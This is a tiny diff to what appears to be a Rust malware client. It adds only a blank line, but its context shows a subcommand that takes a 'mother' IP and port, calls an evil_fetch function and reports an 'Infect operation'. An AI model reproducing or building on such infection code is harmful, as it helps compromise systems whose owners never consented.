@@ -42,6 +42,7 @@ async fn main() {
             let mother_ip = sub_matches.get_one::<std::net::IpAddr>("mother").unwrap();
             let port = sub_matches.get_one::<u16>("port").unwrap();
 
+
             match client::client::evil_fetch(mother_ip, port).await {
                 Ok(_) => println!("Infect operation successful"),
                 Err(_) => println!("Infect operation failed"),
